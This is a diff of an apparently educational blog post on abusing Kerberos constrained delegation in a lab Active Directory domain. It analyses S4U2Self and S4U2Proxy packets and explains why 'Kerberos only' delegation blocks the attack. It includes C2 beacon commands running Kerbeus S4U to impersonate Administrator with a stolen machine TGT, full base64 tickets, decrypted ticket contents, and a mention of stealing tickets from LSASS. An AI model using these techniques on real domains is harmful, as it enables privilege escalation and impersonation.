@@ -440,7 +440,7 @@ The KDC hands back a service ticket to the TARGET service (`cifs`) as the user `
 
 This TGS is encrypted using the target service key (in this case it is `DC01` key).
 
-## Abusing: Protocol Transition
+## Abusing Protocol Transition
 
 If we compromised the `SRV02` machine and extracted the TGT for the `SRV02$` machine account, we can use it to perofrm a S4U2Self request then S4U2Proxy, and we the have complete freedom in what username we put in the TGS-REQ because the DC will blindly trust the cryptographic signature of `SRV02$` (which we stole).
 
@@ -542,18 +542,142 @@ Let's break what is happening:
 5. Listing the `\\DC01\ShareSupport` content.
 6. **AP-REP:** this is the respone of step 3 + HTTP Response.
 
-Let's dive deep one level deep on some important packets..
+Let's dive one level deep on one important packet, you guessed it... the S4U2Proxy packet!
 
 
-### Packet 199 - TGS-REQ
+### TGS-REQ - S4U2Proxy
 ![image](/assets/img/Delegation/10.png)
 
 
 Notices that now we only have 2 PA-DATA and it is missing the `PA-FOR-USER` that we saw earlier in [S4U2Self TGS-REQ requset](https://0xpix3l.github.io/Active-Directory/Delegation/#s4u2self-tgs-req).
 
+We have some interesting parts to look at:
+![image](/assets/img/Delegation/11.png)
 
-if you didn;t notcie
-Without protocol transition The computer's TGT cannot be used to obtain a forwardable service ticket via S4U2self when protocol transition is not enabled.  The S4U2self will still return a ticket but the forwardable flag will not be set, and any attempt to use it with S4U2proxy will fail.
+#### pA-TGS-REQ
+
+This contains the TGT for the machine account itself to the KDC as a prove that they are the legitimate account
+![image](/assets/img/Delegation/12.png)
+
+In the req-body it is asking the KDC for ST for the `cifs\DC01`, And there is a special part called `additional-tickets` that has the `HTTP` TGS that we got back from the TGS-REP (packet 182)
+![image](/assets/img/Delegation/13.png)
+
+
+### The forwardable flag
+
+The main reason that `s4u` attack worked when we had protocol transition enabled because the TGS was forwardable as we have seen above with `krb_description` command, but is it the same here?
+
+
+```
+beacon> krb_s4u /service:cifs/dc01 /impersonateuser:Administrator /ticket:doIE1DCCBNCgAwIBBaEDAgEWooID5DCCA+BhggPcMIID2KADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDojCCA56gAwIBEqEDAgECooIDkASCA4xqoTl9ed6iyQsFWh0GxZnc1Kwd/3PQzeu1qJzfUPAvepWSgkJHJXKJT5EBn0jgBwSg2p5Zjd2No5oiTuxC13BDsHjPLcQ22xmUGAXU5AuoSN+22Wu9OISqsMR2NphyCbtf3S9WCHRrdHLtv+GCJ0JnyIgo8sZcZ8YN+kt1mSNbleSRvyUpQK93Trl/iyA3uRur2hVeOZWDgzRhypEJJlqUdDgXE7OrZDEs6mLvO4AJhiLR+8A2jCE//BsZvNYjlGcRgcjPpqKQzEMJMl9++jp5n29ethuKE1RNNR/wgCW7K7sZMSTYmBxN9RqcKjkiBNrpW812n4oaRoPb+T90RpCJKB9Wcqv/nr8zdRqH1yooZp8tpzURGUTmoD0TDOauOOkND0QXq75mhXTukJsjXtfhFPEe420p/ObVJxYeJp1NoaPEMP0tLJtTURf6b8aCHy7AN9QwehThLfCUFDuRg/0rtri572Kr+MHLki4Fkku2ynpI5Q5G/akCRtHqGlEmZXu4C1MlTaKwSbfpMgSQ7Iui9KJtBXANIe/R7wijfmsmy+mCyu6Ltlwzl87PkaSotEHNU7UmM3Duhi1Gtitk9ghrtmfNV4vneRvhTU9sNVLCDQZ3bCvC0tW462GhAP4SrKaWZ6a5zW9owhrRGue+9BV1TduWaE2PHOKXZQ2d5QZujm/Z2QIzpBB1cydrJTNNKQ33B8z4+OL1sU1/hvq+7xfFu2kQl8fjDtLo8OIHK42cZ1CmRpnATs8pWu8ZKF3GCRZd9ALx/Xx6H2xppTBH8It1u/+RrfHGeYHbAtOK3th4GbhgENKJngbrcPEvtHTcCsr0YJrsAS+UVjvSHpy40oiYNkVRQgr40p4VG+dNRcXxJVjqeQyd7fnVpxP+mm9Zc0/f8ES59dyVClQF+S7RXeD6ZsmUY/I9/wXx8Fs7BIxbTuuw6SWqEv2/19OKeOhXgmgfz3AHK5DtTgwBQMPJgAM5h5Ljl/Mw7WmfCw/7/J5/uT65ZIxC8VEqzo7Emj1VMnlzbi3/R3bU5xpsoUnncVPWCDru58nSWTwFhOo2ay+bPqsU/B+DhZDtoQNR+3nqIQt/cV/eEksY3F9hYyWErfGdYt+td+5nPgt7nz+Z/BYfI1OxGbA7ZUP1Rmfp2T7wjfs/Di0azoHncVccItXbQC3l08ClcU0Q4nVhQVTJoBbNbvSVwhGE4JvaCd9aVKOB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIE9iLIb2vV2RpzzP9soKd4WZlA1xPfGDSp9Gya3NALVfoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKMHAwUAQOEAAKURGA8yMDI2MDMyOTEwMDQ1N1qmERgPMjAyNjAzMjkyMDA0NTdapxEYDzIwMjYwNDA1MTAwNDU3WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
+[+] Kerbeus S4U by RalfHacker
+[+] host called home, sent: 69064 bytes
+[+] received output:
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'SRV02$@LOL.LOCAL'
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'SRV02$@LOL.LOCAL'
+[*] base64(ticket.kirbi):
+
+doIFRDCCBUCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKOCBCEwggQdoAMCARKhAwIBBaKCBA8EggQLQdmjdd3E1Dij26Ttv9OyqAKYP6C00cnZbqcQ+/wdDWNkb+8N+hbDSIGEiomqQhamkXd+8gFdN2XDDqRECpHpzlgEjqOgyo00Rsbfdu9BH3hRAon7pD2ha9o7EehmZLaxEt3aySkL/y7ULhLxpj3nvtX2rDdFn0g1gec0931hxiLB8lCwSelPnRQ702enyiI/RYbhYrCFWtknSCyU5jUK1ZXh66u7G0QfLYRu5IkdYKQ37JAdjRAotrELHnRTYHgfJkMw1jPLBGx4hLopXfUf21nyLyGufri9z0KiubLwkueb9vcUV07ANsvhjw513P9JNJFrgjGz7MYCLDpyiHPe+fZWaN0fwQvTiePoyakwEaeTHTBsJ4W5WIZ9k/HciIj361a42DFaxjCYrK5hda2NIoALKHBWg/TIncLJGpidXD3TtUa5lBLODM6KaUyUa1bRLRGds3UwsLxSD5M4LhBMCi86GSdeZdS2kxB0lAepPg9u5nMhXK6qHgMvWUt8ug8dyctbuHW544/mw6v3G7YXu0XOgh51w0u6fkTjfnJCKDi7iEEdlNvnQ3iDw2aNKW0ooeEWCbwoV+VIOgg31L5IsagsVjkk4VRSzK11L3nCjGiVwGwyXfRAQPhxygMoS1/82QGkAlmeP3oUVX9AhriUmwNA9cWf8FYRyBGtMfiBBG7SiwOfMV6n4Bu1sX676vhNNmdUUohf2rBPJV9fpidpZ9I5ho1NBwTR4D3iAPWp5H2KYUEtPkAGYSCLtza3ULblyRbn4E7aktTJrML09SCXRaJDHTE0UNIIBcUxpvcyVR8I7hbb4Db843o/oW81WHwKIGsnE36ysNrXmE4zOnVIP6a9JHFtIclTb5EQ1BSJDUS7Spoge1rdVf67BFVHp49ChOz6rupofeEPZsEw3gf71wCZzytA6iQHVf6mxGXFj8o1irrWvi1wBdrAMSXZwui3v1M7ny3ZIFXQkLAGsuiySTLUqhrsa7OzM2yabAGfbGv0cpawTiNhEePquNhFXWIgQvADfrKMOV0ha1iz5SOfeyWipNpzzu23JlIPo7GN+l2IjdGf8v2NBosjQZGlH4piTMRuL33Bdhvj+v5qOiPgnuMRDaQdLxQSy1iljfrcO1TANwJJlG3N7Hm7eudw6eRnsQrpjm+LlhizKwTo8lTJNQbLpYaMmrAz8Op1q/0Kz1VVUVb39lUrZIdReoN6BN+SQ5TMPL6H4tANcRzVulK7+LuS6AMbBpoaH9Me3biKo/2emKe8jh0r/dCwQ8L6hPNU2HgddrjpkE5uOmGhzE+pCIrQTyDOHLSMcLSEwowrqNlZCTsOSdNiWB+Dfo/eOdVaR2Hf9jCrnkj3SGFyU+oKxeW7RvVjmrTPRmV1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgKzApoAMCARKhIgQgA3/TI3ao+rtKQ+7bqwj+kAFj51D0yrpEH5E9CcPqQeOhCxsJTE9MLkxPQ0FMohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI2MDMyOTE2NTc1MlqmERgPMjAyNjAzMjkyMDA0NTdapxEYDzIwMjYwMzMwMTY1NzUyWqgLGwlMT0wuTE9DQUypEzARoAMCAQGhCjAIGwZTUlYwMiQ=
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01'
+[*] Building S4U2proxy request for service: 'cifs/dc01'
+
+	[x] Kerberos error : 13
+```
+
+
+Actually no. Without protocol transition we cannot use `srv02` to get a forwardable service ticket with S4U2Self. if we use `krb_describe` to see the s4u2self that we got back it will not have forwardable flag.
+```
+beacon> krb_describe /ticket:doIFRDCCBUCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKOCBCEwggQdoAMCARKhAwIBBaKCBA8EggQLQdmjdd3E1Dij26Ttv9OyqAKYP6C00cnZbqcQ+/wdDWNkb+8N+hbDSIGEiomqQhamkXd+8gFdN2XDDqRECpHpzlgEjqOgyo00Rsbfdu9BH3hRAon7pD2ha9o7EehmZLaxEt3aySkL/y7ULhLxpj3nvtX2rDdFn0g1gec0931hxiLB8lCwSelPnRQ702enyiI/RYbhYrCFWtknSCyU5jUK1ZXh66u7G0QfLYRu5IkdYKQ37JAdjRAotrELHnRTYHgfJkMw1jPLBGx4hLopXfUf21nyLyGufri9z0KiubLwkueb9vcUV07ANsvhjw513P9JNJFrgjGz7MYCLDpyiHPe+fZWaN0fwQvTiePoyakwEaeTHTBsJ4W5WIZ9k/HciIj361a42DFaxjCYrK5hda2NIoALKHBWg/TIncLJGpidXD3TtUa5lBLODM6KaUyUa1bRLRGds3UwsLxSD5M4LhBMCi86GSdeZdS2kxB0lAepPg9u5nMhXK6qHgMvWUt8ug8dyctbuHW544/mw6v3G7YXu0XOgh51w0u6fkTjfnJCKDi7iEEdlNvnQ3iDw2aNKW0ooeEWCbwoV+VIOgg31L5IsagsVjkk4VRSzK11L3nCjGiVwGwyXfRAQPhxygMoS1/82QGkAlmeP3oUVX9AhriUmwNA9cWf8FYRyBGtMfiBBG7SiwOfMV6n4Bu1sX676vhNNmdUUohf2rBPJV9fpidpZ9I5ho1NBwTR4D3iAPWp5H2KYUEtPkAGYSCLtza3ULblyRbn4E7aktTJrML09SCXRaJDHTE0UNIIBcUxpvcyVR8I7hbb4Db843o/oW81WHwKIGsnE36ysNrXmE4zOnVIP6a9JHFtIclTb5EQ1BSJDUS7Spoge1rdVf67BFVHp49ChOz6rupofeEPZsEw3gf71wCZzytA6iQHVf6mxGXFj8o1irrWvi1wBdrAMSXZwui3v1M7ny3ZIFXQkLAGsuiySTLUqhrsa7OzM2yabAGfbGv0cpawTiNhEePquNhFXWIgQvADfrKMOV0ha1iz5SOfeyWipNpzzu23JlIPo7GN+l2IjdGf8v2NBosjQZGlH4piTMRuL33Bdhvj+v5qOiPgnuMRDaQdLxQSy1iljfrcO1TANwJJlG3N7Hm7eudw6eRnsQrpjm+LlhizKwTo8lTJNQbLpYaMmrAz8Op1q/0Kz1VVUVb39lUrZIdReoN6BN+SQ5TMPL6H4tANcRzVulK7+LuS6AMbBpoaH9Me3biKo/2emKe8jh0r/dCwQ8L6hPNU2HgddrjpkE5uOmGhzE+pCIrQTyDOHLSMcLSEwowrqNlZCTsOSdNiWB+Dfo/eOdVaR2Hf9jCrnkj3SGFyU+oKxeW7RvVjmrTPRmV1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgKzApoAMCARKhIgQgA3/TI3ao+rtKQ+7bqwj+kAFj51D0yrpEH5E9CcPqQeOhCxsJTE9MLkxPQ0FMohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI2MDMyOTE2NTc1MlqmERgPMjAyNjAzMjkyMDA0NTdapxEYDzIwMjYwMzMwMTY1NzUyWqgLGwlMT0wuTE9DQUypEzARoAMCAQGhCjAIGwZTUlYwMiQ=
+[+] Kerbeus DESCRIBE by RalfHacker
+[+] host called home, sent: 24796 bytes
+[+] received output:
+[*] Action: Describe ticket
+
+  ServiceName              :  SRV02$
+  ServiceRealm             :  LOL.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  LOL.LOCAL
+  StartTime (UTC)          :  29.03.2026 16:57:52
+  EndTime (UTC)            :  29.03.2026 20:4:57
+  RenewTill (UTC)          :  30.03.2026 16:57:52
+  Flags                    :  renewable pre_authent enc_pa_rep  
+  KeyType                  :  aes256_cts_hmac_sha1
+```
+
+If you haven’t noticed yet, using s4u here won’t get us anywhere. The ticket we receive won’t have the `forwardable` flag set to `1`, which means it can’t be reused for delegation. And without a forwardable ticket, the whole chain breaks and the attack dies right there.
+
+#### Additional tip (why kerberos only is more secure)
+
+But.. what about the TGS-REP that we got from the legitimate request, will it have `forwardable` flag? 
+
+Only one way to find out.. Let's decrypt it!
+
+
+The reason why I am decrypting it because the `flags` are not visible, as we can see that from the [RFC](https://datatracker.ietf.org/doc/html/rfc4120#section-5.4.2)
+![image](/assets/img/Delegation/14.png)
+_AS-REP and TGS-REP has the same structure and the name KDC-REP_
+
+they're buried inside the encrypted part.
+![image](/assets/img/Delegation/15.png)
+
+the question that we should be asking now, which encrypted part that has the flags? we have two the inside the `ticket` and inside the `tgs-rep` itself
+![image](/assets/img/Delegation/16.png)
+
+actually both will have it, `EncTicketPart` and `EncKDCRepPart` one is for DC01 to read the flags and the other is for the client requesting the ticket to know what it just received. I will choose the `EncTicketPart` since I will directly use the `srv02$` key to decrypt it
+
+> *The `EncTicketPart` is encrypted directly using `srv02$` key, while the `EncKDCRepPart` is encrypted using the TGT Session Key from the initial logon. that's why I choose the ticket part to decrypt*
+{: .prompt-info }
+
+So after decrypting it we will get this:
+```
+Sequence:
+ field-0=1082195968
+ field-1=Sequence:
+  field-0=18
+  field-1=0x191ff65e7edbbf9087c8fa7865a669010066bd962095a90ac6816d987c62e59d
+
+ field-2=LOL.LOCAL
+ field-3=Sequence:
+  field-0=1
+  field-1=SequenceOf:
+   pixel
+
+ field-4=Sequence:
+  field-0=1
+  field-1=
+
+ field-5=20260328192943Z
+ field-6=20260328192943Z
+ field-7=20260329052943Z
+ field-8=20260404192943Z
+ field-9=SequenceOf:
+  Sequence:
+   field-0=1
+   field-1=0x308202da308202d6a00402020080a18202cc048202c8050000000000000001000000f001000058000000000000000a0000001400000048020000000000000c0000004800000060020000000000000600000010000000a8020000000000000700000010000000b80200000000000001100800cccccccce0010000000000000000020074d3112be9bedc01ffffffffffffff7fffffffffffffff7f23b30ab4c6bedc01237374de8fbfdc01ffffffffffffff7f0a000a00040002000a000a0008000200320032000c000200000000001000020000000000140002000000000018000200b70000005604000001020000010000001c000200200000000000000000000000000000000000000008000a002000020006000800240002002800020000000000000000001002010000000000000000000000000000000000000000000000000000000000010000002c00020000000000000000000000000005000000000000000500000070006900780065006c00000005000000000000000500000070006900780065006c0000001900000000000000190000005c005c0043003a005c00700072006f006700720061006d0064006100740061005c0074006500730074002e00620061007400000000000000000000000000000000000000000000000000000000000000000000000000000001000000010200000700000005000000000000000400000044004300300031000400000000000000030000004c004f004c00000004000000010400000000000515000000cd77e25c5ee8c9fdc0d1ce6d0100000030000200070000000100000001010000000000120100000000000000806d5b3ae9bedc010a0070006900780065006c00000000001e00100012003000000000000000000070006900780065006c0040006c006f006c002e006c006f00630061006c0000004c004f004c002e004c004f00430041004c0000000000000010000000405ef1ca4b0b941d538adcd010000000d7dea67bbdc9c0406463ed02
+  Sequence:
+   field-0=1
+   field-1=0x3041303fa0040202008da137043530333031a003020100a12a0428010000000020000035662d4bb4a93b91caa92059cc7409a5927e3c9aa09bef37f4c28d481d5507c9
+```
+
+The flags are in `field-0=1082195968` in hex it will will get `0x40820000` and in binary we will get this: `01000000100000100000000000000000`
+
+if we go back to the RFC to see what bit we are looking for we can see this:
+![image](/assets/img/Delegation/17.png)
+And Kerberos reads these bits from left to right. so after mapping it we can see that second bit is set to `1` which indicates that the it IS forwardable.
+
+And that is because when normal Windows computers request a Service Ticket, they natively set the forwardable request bit to 1 by default, just in case the destination server needs it. Because a real user proved their identity with a real password (this why we can scrape LSASS, steal this naturally forwardable ticket, and shove it into the S4U2proxy attack chain.)
+
+But when forging S4U2self, we don't use the user's password.. in fact if DO have it there is no need for all of this delegation stuff, so as a security measure kerberos only make KDC issue a non-forwardable tickets.
+
+### Abusing Kerberos Only
+
+If you haven’t noticed yet, using s4u here won’t get us anywhere. The ticket we receive won’t have the `forwardable` flag set to `1`, which means it can’t be reused for delegation. And without a forwardable ticket, the whole chain breaks and the attack dies right there.
+
+Beside stealing a valid TGS from LSASS and fed it to a s4u2proxy attack chain, I will write another way to abuse it later 
 
 ---
 
@@ -563,6 +687,8 @@ Without protocol transition The computer's TGT cannot be used to obtain a forwar
 [rfc4120](https://datatracker.ietf.org/doc/html/rfc4120)
 
 [Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/)
+
+[S4U2Pwnage - Will Schroeder](https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c)
 
 [^blog]: [Windows authentication attacks part 2 – kerberos](https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/)
 [^protected]: [Protected Users security group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
